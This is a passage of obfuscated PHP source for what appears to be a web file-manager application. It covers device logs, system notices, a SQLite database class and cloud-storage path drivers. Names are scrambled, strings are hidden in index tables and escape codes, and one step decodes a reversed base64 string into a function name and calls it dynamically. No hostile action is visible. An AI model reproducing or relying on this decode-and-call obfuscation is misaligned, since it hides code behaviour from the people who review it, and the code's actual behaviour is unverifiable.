$¦ÒüæÁİ => $´ßÇÂú©) { $ã¬åèº‘ = $´ßÇÂú©[$×í¶‘ùî[33]]; $Ûµæ–Ã = isset($êû‰Ì´Ä[$´ßÇÂú©[$×í¶‘ùî[1761]]]) ? $êû‰Ì´Ä[$´ßÇÂú©[$×í¶‘ùî[1761]]] : !1; $‚—ëñ˜ = strpos($ã¬åèº‘, $×í¶‘ùî[2417]) === 0 ? LNG($×í¶‘ùî[2418]) : LNG($×í¶‘ùî[2413]); $´ßÇÂú©[$×í¶‘ùî[32]] = isset($Ûµæ–Ã[$×í¶‘ùî[32]]) ? $Ûµæ–Ã[$×í¶‘ùî[32]] : LNG($×í¶‘ùî[2413]); $´ßÇÂú©[$×í¶‘ùî[2247]] = isset($Ûµæ–Ã[$×í¶‘ùî[2247]]) ? $Ûµæ–Ã[$×í¶‘ùî[2247]] : $×í¶‘ùî[12]; $´ßÇÂú©[$×í¶‘ùî[1650]] = isset($šïçñÚ[$ã¬åèº‘]) ? $šïçñÚ[$ã¬åèº‘] : $‚—ëñ˜; $´ßÇÂú©[$×í¶‘ùî[2135]] = $Ûµæ–Ã; $ğóÚØêª = json_decode($´ßÇÂú©[$×í¶‘ùî[519]], !0); $´ßÇÂú©[$×í¶‘ùî[2410]] = isset($ğóÚØêª[$×í¶‘ùî[2410]]) ? $ğóÚØêª[$×í¶‘ùî[2410]] : $×í¶‘ùî[12]; $´ßÇÂú©[$×í¶‘ùî[2414]] = IpLocation::get($´ßÇÂú©[$×í¶‘ùî[2410]]); if (strpos($ã¬åèº‘, $×í¶‘ùî[2194]) === 0 || isset($ğóÚØêª[$×í¶‘ùî[2192]])) { $ğóÚØêª[$×í¶‘ùî[100]] = $ÜŒáü²è[$ğóÚØêª[$×í¶‘ùî[203]]]; $ğóÚØêª[$×í¶‘ùî[2208]] = $ÜŒáü²è[$ğóÚØêª[$×í¶‘ùî[2192]]]; if ($ğóÚØêª[$×í¶‘ùî[33]] == $×í¶‘ùî[613]) { $ğóÚØêª[$×í¶‘ùî[519]][$×í¶‘ùî[1216]] = $ÜŒáü²è[$ğóÚØêª[$×í¶‘ùî[519]][$×í¶‘ùî[1216]]]; $ğóÚØêª[$×í¶‘ùî[519]][$×í¶‘ùî[1217]] = $ÜŒáü²è[$ğóÚØêª[$×í¶‘ùî[519]][$×í¶‘ùî[1217]]]; } if ($ğóÚØêª[$×í¶‘ùî[33]] == $×í¶‘ùî[2203]) { $ğóÚØêª[$×í¶‘ùî[519]][$×í¶‘ùî[203]] = $ÜŒáü²è[$ğóÚØêª[$×í¶‘ùî[519]][$×í¶‘ùî[203]]]; } if ($ğóÚØêª[$×í¶‘ùî[33]] == $×í¶‘ùî[1928]) { $ğóÚØêª[$×í¶‘ùî[2208]] = $ğóÚØêª[$×í¶‘ùî[100]]; $ğóÚØêª[$×í¶‘ùî[2192]] = $ğóÚØêª[$×í¶‘ùî[2208]][$×í¶‘ùî[203]]; $ğóÚØêª[$×í¶‘ùî[100]] = !1; $ğóÚØêª[$×í¶‘ùî[203]] = $×í¶‘ùî[12]; } $ú’×ù•ı = array($×í¶‘ùî[1928], $×í¶‘ùî[2190]); if (!in_array($ğóÚØêª[$×í¶‘ùî[33]], $ú’×ù•ı)) { if ($ğóÚØêª[$×í¶‘ùî[100]] && $ğóÚØêª[$×í¶‘ùî[100]][$×í¶‘ùî[200]] == $×í¶‘ùî[201]) { $ëŠÒ‰èÃ[] = $´ßÇÂú©[$×í¶‘ùî[468]]; unset($ŞĞ—ÍñÔ[$¦ÒüæÁİ]); continue; } if ($ğóÚØêª[$×í¶‘ùî[2208]] && $ğóÚØêª[$×í¶‘ùî[2208]][$×í¶‘ùî[200]] == $×í¶‘ùî[201]) { $ëŠÒ‰èÃ[] = $´ßÇÂú©[$×í¶‘ùî[468]]; unset($ŞĞ—ÍñÔ[$¦ÒüæÁİ]); continue; } } } $´ßÇÂú©[$×í¶‘ùî[519]] = $ğóÚØêª; unset($´ßÇÂú©[$×í¶‘ùî[2419]]); $­Ú½Ù“[] = $´ßÇÂú©; } $this->clearSystemPathLog($ëŠÒ‰èÃ); return $­Ú½Ù“; } private function clearSystemPathLog($ò‘şğ Ê) { $ÒËÀ§³ =& $_SERVER[è¶³ÒßÑ]; if (count($ò‘şğ Ê) == 0) { return; } $‰ØŒ·À‰ = array($ÒËÀ§³[468] => array($ÒËÀ§³[7], array_unique($ò‘şğ Ê))); $this->where($‰ØŒ·À‰)->delete(); } public function deviceList($÷¨ßà‡ş, $êÈºÇ›¼ = 0) { $ü‰ú¸ø× =& $_SERVER[è¶³ÒßÑ]; $Í½şƒ¨ = array($ü‰ú¸ø×[1761] => $÷¨ßà‡ş, $ü‰ú¸ø×[241] => array($ü‰ú¸ø×[1067], $êÈºÇ›¼), $ü‰ú¸ø×[33] => $ü‰ú¸ø×[1902]); $Ï˜¡Çâ€ = array(); $Úè•Ú™Ê = $this->field($ü‰ú¸ø×[2420])->where($Í½şƒ¨)->order($ü‰ú¸ø×[2206])->limit(50)->select(); foreach ($Úè•Ú™Ê as $‰Åñ¨§Ï => $ÙÖ†ì™÷) { if ($‰Åñ¨§Ï > 0 && abs($ÙÖ†ì™÷[$ü‰ú¸ø×[241]] - $Úè•Ú™Ê[$‰Åñ¨§Ï - 1][$ü‰ú¸ø×[241]]) < 5) { continue; } $óçşçã = json_decode($ÙÖ†ì™÷[$ü‰ú¸ø×[519]], !0); $ÙÖ†ì™÷[$ü‰ú¸ø×[2410]] = isset($óçşçã[$ü‰ú¸ø×[2410]]) ? $óçşçã[$ü‰ú¸ø×[2410]] : $ü‰ú¸ø×[12]; unset($óçşçã[$ü‰ú¸ø×[2410]]); $‚òÔ±¹€ = $this->deviceType($óçşçã[$ü‰ú¸ø×[2195]]); if (isset($Ï˜¡Çâ€[$‚òÔ±¹€])) { continue; } $ÙÖ†ì™÷[$ü‰ú¸ø×[2414]] = IpLocation::get($ÙÖ†ì™÷[$ü‰ú¸ø×[2410]]); $ÙÖ†ì™÷[$ü‰ú¸ø×[519]] = $óçşçã; $Ï˜¡Çâ€[$‚òÔ±¹€] = $ÙÖ†ì™÷; } return array_values($Ï˜¡Çâ€); } public function deviceType($Í³¡šú) { return $Í³¡šú; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\156\x6f\164\x69\143\x65\x4c\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\143\x6f\156\164\x65\156\164", "\141\x75\164\150", "\155\x6f\x64\145", "\164\151\155\x65", "\164\171\160\x65", "\x6c\145\x76\x65\x6c", "\145\156\x61\142\x6c\145", "\x73\157\x72\164"); public function listData($ƒÅù‰”— = false, $†åş€® = "\163\157\162\164", $ºÓÆ„‹– = false) { return parent::listData($ƒÅù‰”—, $†åş€®, $ºÓÆ„‹–); } public function add($Ñ¬õºø“) { $æï‘’ÛÕ =& $_SERVER[è¶³ÒßÑ]; $Ø‡¨Ó·¥ = time(); if ($Ñ¬õºø“[$æï‘’ÛÕ[16]] == $æï‘’ÛÕ[2421]) { $Ø‡¨Ó·¥ = strtotime($Ñ¬õºø“[$æï‘’ÛÕ[216]]); } $Ñ¬õºø“[$æï‘’ÛÕ[216]] = $Ø‡¨Ó·¥; return parent::insert($Ñ¬õºø“); } public function update($ú‘±–…ş, $è°Œ¸¾¡) { $€ñğÄ­ =& $_SERVER[è¶³ÒßÑ]; $©‰î®Ú€ = $this->listData($ú‘±–…ş); if (!$©‰î®Ú€) { return !1; } $å¨×Èç = time(); if ($è°Œ¸¾¡[$€ñğÄ­[16]] == $€ñğÄ­[2421]) { $å¨×Èç = strtotime($è°Œ¸¾¡[$€ñğÄ­[216]]); } $è°Œ¸¾¡[$€ñğÄ­[216]] = $å¨×Èç; return parent::update($ú‘±–…ş, $è°Œ¸¾¡); } public function remove($´åõ½²Ï) { $ì¾×ª  = $this->listData($´åõ½²Ï); if (!$ì¾×ª  || $ì¾×ª [$_SERVER[è¶³ÒßÑ][201]]) { return !1; } return parent::remove($´åõ½²Ï); } public function sort($™Ùæ÷”Ï, $®ôû‘ı÷) { return parent::update($™Ùæ÷”Ï, $®ôû‘ı÷); } public function enable($—˜úÚ£, $ÇĞÖç) { return parent::update($—˜úÚ£, array($_SERVER[è¶³ÒßÑ][2422] => $ÇĞÖç)); } private function initUserOption() { $áĞÑ¿®» =& $_SERVER[è¶³ÒßÑ]; $this->optionType = $áĞÑ¿®»[2423]; $this->modelType = $áĞÑ¿®»[2424]; $this->field = array($áĞÑ¿®»[2425], $áĞÑ¿®»[32], $áĞÑ¿®»[216], $áĞÑ¿®»[33], $áĞÑ¿®»[2426], $áĞÑ¿®»[804], $áĞÑ¿®»[236]); } public function userNoticeGet($öõ±½ÈŒ = false) { $this->initUserOption(); return parent::listData($öõ±½ÈŒ, $_SERVER[è¶³ÒßÑ][468], !0); } public function userNoticeAdd($ë›„„ë¦) { $éÄ¾÷ˆ¦ =& $_SERVER[è¶³ÒßÑ]; $this->initUserOption(); $®´Ö”¨š = $this->findByKey($éÄ¾÷ˆ¦[2425], $ë›„„ë¦[$éÄ¾÷ˆ¦[468]]); if ($®´Ö”¨š) { return !0; } $‹×˜Õ×Ô = array($éÄ¾÷ˆ¦[2425] => $ë›„„ë¦[$éÄ¾÷ˆ¦[468]], $éÄ¾÷ˆ¦[32] => $ë›„„ë¦[$éÄ¾÷ˆ¦[32]], $éÄ¾÷ˆ¦[216] => $ë›„„ë¦[$éÄ¾÷ˆ¦[216]], $éÄ¾÷ˆ¦[33] => isset($ë›„„ë¦[$éÄ¾÷ˆ¦[33]]) ? $ë›„„ë¦[$éÄ¾÷ˆ¦[33]] : 1, $éÄ¾÷ˆ¦[2426] => isset($ë›„„ë¦[$éÄ¾÷ˆ¦[2426]]) ? $ë›„„ë¦[$éÄ¾÷ˆ¦[2426]] : 0, $éÄ¾÷ˆ¦[804] => 0, $éÄ¾÷ˆ¦[236] => 0); return parent::insert($‹×˜Õ×Ô); } public function userNoticeEdit($óÇ“¸˜å, $øô§¼) { $this->initUserOption(); return parent::update($óÇ“¸˜å, $øô§¼); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\x65\x6d\137\157\160\x74\151\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\157\x6c\x65", "\x72\157\x6c\x65\x47\x72\x6f\165\160", "\x72\x65\x67\x69\x73\x74", "\x65\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($¥âª›Ûü) { return "\x53\171\x73\164\x65\155\117\x70\x74\x69\157\156\x5f{$¥âª›Ûü}"; } protected function optionDefault($ğˆœÎ”À = '') { $Ğ¦Î ãš =& $_SERVER[è¶³ÒßÑ]; if ($ğˆœÎ”À == $Ğ¦Î ãš[12]) { return $GLOBALS[$Ğ¦Î ãš[6]][$Ğ¦Î ãš[450]]; } } } goto eêÊ™ğÜ‰; a•ğ­Ì¥®Ğ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $óÕö–¼ =& $_SERVER[è¶³ÒßÑ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$óÕö–¼[6]] =& $config; $this->values[$óÕö–¼[7]] =& $in; $this->tpl = TEMPLATE . MOD . $óÕö–¼[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ûòã ¸) { if (1 === func_num_args()) { $this->{$ûòã ¸} = new $ûòã ¸(); } else { $ƒÁ°Ôµ× = new ReflectionClass($ûòã ¸); $äì–Û£ = func_get_args(); array_shift($äì–Û£); $this->{$ûòã ¸} = $ƒÁ°Ôµ×->newInstanceArgs($äì–Û£); } return $this->{$ûòã ¸}; } public function routeBind($ï„åŒ˜Š, $ÉØ–øË, $ûÏì­İ = 3) { $Şß—‹è¶ =& $_SERVER[è¶³ÒßÑ]; $Ÿ‰×¢ˆ€ = $this->in[$Şß—‹è¶[9]]; $ï„åŒ˜Š = str_replace($Şß—‹è¶[10], $Şß—‹è¶[11], trim(trim($ï„åŒ˜Š, $Şß—‹è¶[8]), $Şß—‹è¶[12])); if (!$ï„åŒ˜Š || count($Ÿ‰×¢ˆ€) <= $ûÏì­İ) { return !1; } $ÅÎá¶—¬ = !0; $—ÜÌç°® = explode($Şß—‹è¶[8], $ï„åŒ˜Š); for ($·°Ú§íì = 0; $·°Ú§íì < count($—ÜÌç°®); $·°Ú§íì++) { if ($—ÜÌç°®[$·°Ú§íì] != $Ÿ‰×¢ˆ€[$ûÏì­İ + $·°Ú§íì]) { $ÅÎá¶—¬ = !1; break; } } if (!$ÅÎá¶—¬) { return; } call_user_func_array(array($this, $ÉØ–øË), array()); } public function routeArgs($³‚°éÛ = 3) { $ÅöÃºò± = $this->in[$_SERVER[è¶³ÒßÑ][9]]; if (count($ÅöÃºò±) <= $³‚°éÛ) { return array(); } $øºì¿­– = array(); for ($¢²ï€šœ = $³‚°éÛ; $¢²ï€šœ < count($ÅöÃºò±); $¢²ï€šœ += 2) { $øºì¿­–[$ÅöÃºò±[$¢²ï€šœ]] = $ÅöÃºò±[$¢²ï€šœ + 1]; $this->in[$ÅöÃºò±[$¢²ï€šœ]] = $ÅöÃºò±[$¢²ï€šœ + 1]; } return $øºì¿­–; } protected function assign($»üî÷İ, $ù¤´£¥) { $this->values[$»üî÷İ] = $ù¤´£¥; } protected function display($öŒ¿‚êï) { ob_end_clean(); extract($this->values); require $this->tpl . $öŒ¿‚êï; } } class DbSqliteBase extends Db { public function __construct($Õ×êüËı = '') { $¨»»ú¹® =& $_SERVER[è¶³ÒßÑ]; if (!extension_loaded($¨»»ú¹®[13])) { think_exception(think_lang($¨»»ú¹®[14]) . $¨»»ú¹®[15]); } if (!empty($Õ×êüËı)) { if (!isset($Õ×êüËı[$¨»»ú¹®[16]])) { $Õ×êüËı[$¨»»ú¹®[16]] = 438; } $this->config = $Õ×êüËı; if (empty($this->config[$¨»»ú¹®[17]])) { $this->config[$¨»»ú¹®[17]] = array(); } } } public function connect($ÒĞü¡Â” = '', $±ôè‚î = 0) { $°ß­¶•Í =& $_SERVER[è¶³ÒßÑ]; if (!isset($this->linkID[$±ôè‚î])) { if (empty($ÒĞü¡Â”)) { $ÒĞü¡Â” = $this->config; } $òß¦â²— = !empty($ÒĞü¡Â”[$°ß­¶•Í[17]][$°ß­¶•Í[18]]) ? $ÒĞü¡Â”[$°ß­¶•Í[17]][$°ß­¶•Í[18]] : $this->pconnect; $–¤§·ûŸ = $òß¦â²— ? $°ß­¶•Í[19] : $°ß­¶•Í[20]; $this->linkID[$±ôè‚î] = $–¤§·ûŸ($ÒĞü¡Â”[$°ß­¶•Í[21]], $ÒĞü¡Â”[$°ß­¶•Í[16]]); if (!$this->linkID[$±ôè‚î]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$±ôè‚î], 30000); if (1 != think_config($°ß­¶•Í[22])) { unset($this->config); } } return $this->linkID[$±ôè‚î]; } public function free() { $this->queryID = null; } public function query($”ÛÆ¸¾Ï) { $„…±†° =& $_SERVER[è¶³ÒßÑ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $”ÛÆ¸¾Ï; if ($this->queryID) { $this->free(); } think_action_status($„…±†°[23], 1); think_status($„…±†°[24]); $this->queryID = sqlite_query($this->_linkID, $”ÛÆ¸¾Ï); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¹õ¶œªÄ = $this->getAll(); return $¹õ¶œªÄ; } } public function execute($…Şª„âì) { $¦‡şÒì¦ =& $_SERVER[è¶³ÒßÑ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $…Şª„âì; if ($this->queryID) { $this->free(); } think_action_status($¦‡şÒì¦[25], 1); think_status($¦‡şÒì¦[24]); $®ÊÎ¿ŠÄ = sqlite_exec($this->_linkID, $…Şª„âì); $this->debug(); if (!1 === $®ÊÎ¿ŠÄ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[è¶³ÒßÑ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ıù€×ˆ = sqlite_query($this->_linkID, $_SERVER[è¶³ÒßÑ][27]); if (!$ıù€×ˆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $À˜ğ¨³” = sqlite_query($this->_linkID, $_SERVER[è¶³ÒßÑ][28]); if (!$À˜ğ¨³”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¯­Î…Ã” = array(); if ($this->numRows > 0) { for ($»½àô = 0; $»½àô < $this->numRows; $»½àô++) { $¯­Î…Ã”[$»½àô] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¯­Î…Ã”; } public function getFields($£ö½Ô‰) { $÷„çö«± =& $_SERVER[è¶³ÒßÑ]; $ºˆ°ú = $this->query($÷„çö«±[29] . $£ö½Ô‰ . $÷„çö«±[30]); $¥š…ßÄ¢ = array(); if ($ºˆ°ú) { foreach ($ºˆ°ú as $Îıµã => $úäçÚë) { $¥š…ßÄ¢[$úäçÚë[$÷„çö«±[31]]] = array($÷„çö«±[32] => $úäçÚë[$÷„çö«±[31]], $÷„çö«±[33] => $úäçÚë[$÷„çö«±[34]], $÷„çö«±[35] => (bool) ($úäçÚë[$÷„çö«±[36]] === $÷„çö«±[12]), $÷„çö«±[37] => $úäçÚë[$÷„çö«±[38]], $÷„çö«±[39] => strtolower($úäçÚë[$÷„çö«±[40]]) == $÷„çö«±[41], $÷„çö«±[42] => strtolower($úäçÚë[$÷„çö«±[43]]) == $÷„çö«±[44]); } } return $¥š…ßÄ¢; } public function getTables($Õ« ß¨™ = '') { $ëÚòú€ó =& $_SERVER[è¶³ÒßÑ]; $”—ıÀ¸ç = $this->query($ëÚòú€ó[45] . $ëÚòú€ó[46] . $ëÚòú€ó[47]); $çûö¢Ï­ = array(); foreach ($”—ıÀ¸ç as $ğ”Àİ => $§ì¦¤Ò£) { $çûö¢Ï­[$ğ”Àİ] = current($§ì¦¤Ò£); } return $çûö¢Ï­; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¨®¯ªáİ =& $_SERVER[è¶³ÒßÑ]; $€–ï÷ğì = sqlite_last_error($this->_linkID); $this->error = $€–ï÷ğì . $¨®¯ªáİ[4] . sqlite_error_string($€–ï÷ğì); if ($¨®¯ªáİ[12] != $this->queryStr) { $this->error .= LNG($¨®¯ªáİ[48]) . $this->queryStr; } think_trace($this->error, $¨®¯ªáİ[12], $¨®¯ªáİ[49]); return $this->error; } public function escapeString($Í´¦Äº¥) { return sqlite_escape_string($Í´¦Äº¥); } public function parseLimit($½òĞöàá) { $¢Î¡·›µ =& $_SERVER[è¶³ÒßÑ]; $¹ÆŞï¥å = $¢Î¡·›µ[12]; if (!empty($½òĞöàá)) { $½òĞöàá = explode($¢Î¡·›µ[50], $½òĞöàá); if (count($½òĞöàá) > 1) { $¹ÆŞï¥å .= $¢Î¡·›µ[51] . $½òĞöàá[1] . $¢Î¡·›µ[52] . $½òĞöàá[0] . $¢Î¡·›µ[53]; } else { $¹ÆŞï¥å .= $¢Î¡·›µ[51] . $½òĞöàá[0] . $¢Î¡·›µ[53]; } } return $¹ÆŞï¥å; } } $_file = $_SERVER[$_SERVER[è¶³ÒßÑ][54]]; goto AçØ‘ÀÒòÀ; fõœÀ°òø´: $fileSize = strrev(base64_decode($_SERVER[àÚÌê´İ][0])); function binCheckNeq($°Âç¶û³, $Ğˆ÷Üâİ) { return $°Âç¶û³ != $Ğˆ÷Üâİ; } $_SERVER[$_SERVER[àÚÌê´İ][1]] = $fileSize($_SERVER[$_SERVER[àÚÌê´İ][2]]); goto c¹ëŠ†ö˜; B•œî‡È’: class PathDriverBOS extends PathDriverS3 { public function __construct($âÚ±ÄŒô) { parent::__construct($âÚ±ÄŒô); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($ˆáÉğÂÉ) { $»“µò² =& $_SERVER[è¶³ÒßÑ]; if (substr($ˆáÉğÂÉ, 0, 7) == $»“µò²[1385]) { $ˆáÉğÂÉ = $»“µò²[1386] . substr($ˆáÉğÂÉ, 7); } header($»“µò²[185] . $ˆáÉğÂÉ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¸€¸ĞÕ«) { parent::__construct($¸€¸ĞÕ«); $this->setSignVersion($_SERVER[è¶³ÒßÑ][257]); } public function uploadFormData($ö¾ŠŒ¯ß, $ó¥¸Û‹« = 3600) { $ôÜ«“ñ° =& $_SERVER[è¶³ÒßÑ]; $©¾±¦¾Ò = $ôÜ«“ñ°[239]; $½ßåÄ‹í = $ôÜ«“ñ°[272]; $èö¬ûú¢ = $ôÜ«“ñ°[283]; $ÌÂœ®›Ñ = gmdate($ôÜ«“ñ°[1387], time() + $ó¥¸Û‹«); $£¥¤½ = (string) time() . $ôÜ«“ñ°[84] . (string) (time() + $ó¥¸Û‹«); $ê™Á¥Ş˜ = array($ôÜ«“ñ°[284] => $ÌÂœ®›Ñ, $ôÜ«“ñ°[287] => array(array($ôÜ«“ñ°[289] => $©¾±¦¾Ò), array($ôÜ«“ñ°[288] => $this->bucket), array($ôÜ«“ñ°[290], $ôÜ«“ñ°[291], $ôÜ«“ñ°[12]), array($ôÜ«“ñ°[294] => $èö¬ûú¢), array($ôÜ«“ñ°[1388] => $½ßåÄ‹í), array($ôÜ«“ñ°[1389] => $this->accessKey), array($ôÜ«“ñ°[1390] => $£¥¤½))); $ê™Á¥Ş˜ = json_encode($ê™Á¥Ş˜); $»¥›ÅŸ½ = hash_hmac($ôÜ«“ñ°[272], $£¥¤½, $this->secret); $‘Şé¾ßÔ = sha1($ê™Á¥Ş˜); $”Ò£±ëÁ = hash_hmac($ôÜ«“ñ°[272], $‘Şé¾ßÔ, $»¥›ÅŸ½); $Ö†É¤Ô„ = array($ôÜ«“ñ°[289] => $©¾±¦¾Ò, $ôÜ«“ñ°[294] => $èö¬ûú¢, $ôÜ«“ñ°[302] => base64_encode($ê™Á¥Ş˜), $ôÜ«“ñ°[1388] => $½ßåÄ‹í, $ôÜ«“ñ°[1389] => $this->accessKey, $ôÜ«“ñ°[1391] => $£¥¤½, $ôÜ«“ñ°[1392] => $”Ò£±ëÁ, $ôÜ«“ñ°[218] => $this->getHost()); return $Ö†É¤Ô„; } public function fileOutImage($‹«çòâ, $ûüœ±ı¢ = 250) { $©–òÒÍ« =& $_SERVER[è¶³ÒßÑ]; if ($this->size($‹«çòâ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($‹«çòâ, $ûüœ±ı¢); } $¦õÎ¿İ = $this->link($‹«çòâ); $¦õÎ¿İ .= $©–òÒÍ«[1393] . $ûüœ±ı¢ . $©–òÒÍ«[1394]; $this->fileOutLink($¦õÎ¿İ); } public function fileOutLink($€¯É½Ññ) { $ºí„ºó­ =& $_SERVER[è¶³ÒßÑ]; if (substr($€¯É½Ññ, 0, 7) == $ºí„ºó­[1385]) { $€¯É½Ññ = $ºí„ºó­[1386] . substr($€¯É½Ññ, 7); } header($ºí„ºó­[185] . $€¯É½Ññ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($è†’Ü) { $this->pathParse = $è†’Ü; $this->model = Model($_SERVER[è¶³ÒßÑ][1395]); } public function getPath($€½‹Ãá²) { return trim($€½‹Ãá², $_SERVER[è¶³ÒßÑ][8]); } public function pathFather($Ò²ôÂ‚‹) { $åùÖæòÇ = $this->parse($Ò²ôÂ‚‹); $åùÖæòÇ = $this->infoSimple($Ò²ôÂ‚‹); return $åùÖæòÇ ? $åùÖæòÇ[$_SERVER[è¶³ÒßÑ][202]] : !1; } public function pathThis($Øˆã½Ú¢) { $§ïş¤Õ = $this->infoSimple($Øˆã½Ú¢); return $§ïş¤Õ ? $§ïş¤Õ[$_SERVER[è¶³ÒßÑ][32]] : !1; } public function getPathOuter($çÆë‚µ¾) { if (!$çÆë‚µ¾) { return $çÆë‚µ¾; } $Û³µ­âì = $this->parse($çÆë‚µ¾); return KodIO::make($Û³µ­âì[$_SERVER[è¶³ÒßÑ][468]]); } public function copyFolderFromIO($à¥‹°, $êœÆï», $ŞÀÍ£íş, $ŒÔßê, $Í·„Ø‰³) { $÷ºä¯³ = $this->model->copyFolderFromIO($à¥‹°, $êœÆï», $ŞÀÍ£íş, $ŒÔßê, $Í·„Ø‰³); return KodIO::make($÷ºä¯³); } public function isParentOf($ãâËŸ‘™, $Í¶¥¬“Œ) { return $this->model->isParentOf($ãâËŸ‘™, $Í¶¥¬“Œ); } public function mkfile($¶†¨Ê‰¼, $Ñ¼•ÒØ = '', $°íóë›Ï = REPEAT_RENAME) { $ÌŸ¼Ã†Ç =& $_SERVER[è¶³ÒßÑ]; $¸šÈÄâğ = $this->parse($¶†¨Ê‰¼); $¶†¨Ê‰¼ = $¸šÈÄâğ[$ÌŸ¼Ã†Ç[468]]; for ($ÇÜÜæ­Ş = 0; $ÇÜÜæ­Ş < count($¸šÈÄâğ[$ÌŸ¼Ã†Ç[1396]]); $ÇÜÜæ­Ş++) { $ÓÄ·É“± = $¸šÈÄâğ[$ÌŸ¼Ã†Ç[1396]][$ÇÜÜæ­Ş]; if ($ÇÜÜæ­Ş == count($¸šÈÄâğ[$ÌŸ¼Ã†Ç[1396]]) - 1) { $¶†¨Ê‰¼ = $this->model->mkfile($¶†¨Ê‰¼, $ÓÄ·É“±, $Ñ¼•ÒØ, $°íóë›Ï); break; } $¶†¨Ê‰¼ = $this->model->mkdir($¶†¨Ê‰¼, $ÓÄ·É“±, REPEAT_SKIP); } return $this->getPathOuter($¶†¨Ê‰¼); } public function mkdir($ß´ˆçºÜ, $ü‡öÌçà = REPEAT_SKIP) { $¢É¿Š¥å =& $_SERVER[è¶³ÒßÑ]; $ìİÛêÚ = $this->parse($ß´ˆçºÜ); $ß´ˆçºÜ = $ìİÛêÚ[$¢É¿Š¥å[468]]; for ($ªâî²ış = 0; $ªâî²ış < count($ìİÛêÚ[$¢É¿Š¥å[1396]]); $ªâî²ış++) { $˜”Äù©Û = $ìİÛêÚ[$¢É¿Š¥å[1396]][$ªâî²ış]; $ß´ˆçºÜ = $this->model->mkdir($ß´ˆçºÜ, $˜”Äù©Û, $ü‡öÌçà); } return $this->getPathOuter($ß´ˆçºÜ); } public function copyFile($¾ïáÏ‰, $Ô²âØ Ï, $ŠÆ˜ƒ¬¬ = REPEAT_REPLACE) { $Ù‘ˆàÈ =& $_SERVER[è¶³ÒßÑ]; $Çü¸ø€Ç = $this->parse($Ô²âØ Ï); $üÁ£ãÓı = $this->model->copy($¾ïáÏ‰, $Çü¸ø€Ç[$Ù‘ˆàÈ[468]], $ŠÆ˜ƒ¬¬, $Çü¸ø€Ç[$Ù‘ˆàÈ[97]]); return $üÁ£ãÓı ? $this->getPathOuter($üÁ£ãÓı) : !1; } public function moveFile($ßƒšÍ¼, $áøû²Ö, $§Â£‹äˆ = REPEAT_REPLACE) { $¹õ¥¦— =& $_SERVER[è¶³ÒßÑ]; $ªúâÓÔÅ = $this->parse($áøû²Ö); $İŠ­æÂ‚ = $this->model->move($ßƒšÍ¼, $ªúâÓÔÅ[$¹õ¥¦—[468]], $§Â£‹äˆ, $ªúâÓÔÅ[$¹õ¥¦—[97]]); return $İŠ­æÂ‚ ? $this->getPathOuter($İŠ­æÂ‚) : !1; } public function copy($¡Ì²Îİ‡, $ø…Ñ €¥, $´ØÌ¬£ã = REPEAT_REPLACE, $Êëë´© = false) { $™Ã“„­ = $this->parse($ø…Ñ €¥); $óáÕó´‰ = $this->model->copy($¡Ì²Îİ‡, $™Ã“„­[$_SERVER[è¶³ÒßÑ][468]], $´ØÌ¬£ã, $Êëë´©); return $óáÕó´‰ ? $this->getPathOuter($óáÕó´‰) : !1; } public function moveSameAllow() { } public function move($âìŒ´¤š, $Çäğ–, $›Ç—â¯ = REPEAT_REPLACE, $œËæ = false) { $Ç§’Ğ™ = $this->parse($Çäğ–); $²‘¤‚Íœ = $this->model->move($âìŒ´¤š, $Ç§’Ğ™[$_SERVER[è¶³ÒßÑ][468]], $›Ç—â¯, $œËæ); return $²‘¤‚Íœ ? $this->getPathOuter($²‘¤‚Íœ) : !1; } public function remove($’ôÎÄ Ì, $–ñÏÇ … = true) { return $this->model->remove($’ôÎÄ Ì, $–ñÏÇ …); } public function rename($üçô‹İö, $—¨´Ã¯) { $°ÅıÙˆ = $this->model->rename($üçô‹İö, $—¨´Ã¯); return $°ÅıÙˆ ? $this->getPathOuter($üçô‹İö) : $°ÅıÙˆ; } public function size($å†»áƒš) { $üçÓñêÎ = $this->infoSimple($å†»áƒš); return $üçÓñêÎ ? $üçÓñêÎ[$_SERVER[è¶³ÒßÑ][89]] : 0; } public function infoSimple($øß®ØÓ) { return $this->model->sourceInfo($øß®ØÓ); } public function info($ü½ßÙ£¡) { return $this->infoParse($ü½ßÙ£¡); } public function infoAuth($™¢øÑ´ş) { return $this->infoParse($™¢øÑ´ş, !1, !0); } public function infoWithChildren($ãî„øÂ–) { return $this->infoParse($ãî„øÂ–, !0); } protected function infoParse($ô²Ï—½À, $ê¯İ¹Èš = false, $‰ØÉ¹Ó = false) { if (!$ê¯İ¹Èš) { return $this->model->pathInfo($ô²Ï—½À, $‰ØÉ¹Ó); } return $this->model->pathInfoMore($ô²Ï—½À); } public function 